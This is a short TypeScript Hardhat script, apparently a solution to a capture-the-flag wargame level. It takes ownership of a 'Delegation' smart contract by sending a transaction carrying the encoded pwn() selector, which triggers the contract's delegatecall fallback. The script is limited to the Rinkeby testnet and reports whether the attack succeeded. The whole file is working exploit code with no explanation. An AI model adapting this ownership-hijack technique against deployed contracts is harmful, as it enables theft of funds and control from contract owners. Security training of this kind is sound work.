import "@ethersproject/abstract-provider"
import { ethers, getNamedAccounts, network } from "hardhat"
import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}=await getNamedAccounts()
        const exploiterAcc= await ethers.getSigner(exploiter)
        const delegationContract= await ethers.getContractAt('Delegation',process.env.DELEGATION_ADDRESS as string)
        const pwnSignature = (new ethers.utils.Interface(["function pwn()"])).encodeFunctionData("pwn",[])

        console.log(`Function signature ${pwnSignature}`)
        const tx=await exploiterAcc.sendTransaction({
            from: exploiter,
            to: delegationContract.address,
            data: (new ethers.utils.Interface(["function pwn()"])).encodeFunctionData("pwn",[]), //https://github.com/ethers-io/ethers.js/issues/478
            gasPrice: (await ethers.provider.getGasPrice()).mul(3),
            gasLimit: 1000000
        })

        console.log(`Transaction id: ${tx.hash}`)
        await tx.wait()
        //console.log(`Old owner: ${tx.hash}`)
        //console.log(`New owner: ${tx.hash}`)
        if((await delegationContract.owner())===exploiter){
            console.log("Successful attack")
        }else{
            console.log("Attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
